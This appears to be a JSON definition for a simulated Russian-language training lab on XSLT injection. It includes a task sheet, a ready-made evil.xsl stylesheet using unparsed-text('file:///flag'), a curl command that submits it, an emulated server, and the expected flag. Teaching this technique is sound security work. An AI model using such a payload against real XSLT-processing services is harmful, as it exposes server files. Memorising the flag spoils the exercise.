@@ -1,0 +1,23 @@
+{
+  "id": "web-ssi-xslt-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{xslt_unp4rs3d_t3xt_r34d}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: XSLT-инъекция → чтение файла\n\nСервис `https://reports.example/report` принимает XML с данными и XSLT-шаблон,\nкоторый ПРИМЕНЯЕТ к этому XML. XSLT — полноценный язык с функциями\n`document()` и `unparsed-text()`, читающими файлы и ходящими по сети.\n\n1. Нормальный отчёт: `curl -s -X POST https://reports.example/report -H 'Content-Type: application/xml' --data-binary @data.xml`.\n2. В каталоге лежит готовый `evil.xsl` — шаблон с `unparsed-text('file:///flag')`.\n3. Отправь его сервису и запиши ответ в found.txt:\n\n   curl -s -X POST https://reports.example/report -H 'Content-Type: application/xml' --data-binary @evil.xsl > found.txt\n\n4. Набери `check`.\n" },
+    { "path": "/home/student/task/data.xml", "text": "<sales><row><item>Чайник</item><amount>1200</amount></row></sales>\n" },
+    { "path": "/home/student/task/evil.xsl", "text": "<?xml version=\"1.0\"?>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n  <xsl:template match=\"/\">\n    <out><xsl:value-of select=\"unparsed-text('file:///flag')\"/></out>\n  </xsl:template>\n</xsl:stylesheet>\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция reports.example/report)",
+      "cases": [
+        { "match": "evil\\.xsl|unparsed-text|@evil", "example": "-X POST https://reports.example/report --data-binary @evil.xsl", "output": "<out>nto{xslt_unp4rs3d_t3xt_r34d}</out>\n" },
+        { "match": "#exec|ssi", "example": "-X POST https://reports.example/report --data-binary @ssi.html", "output": "nto{xslt_unp4rs3d_t3xt_r34d}\n" },
+        { "match": "report|data\\.xml|@data", "example": "-X POST https://reports.example/report --data-binary @data.xml", "output": "<table><tr><td>Чайник</td><td>1200</td></tr></table>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только POST /report на reports.example.\n"
+    }
+  }
+}
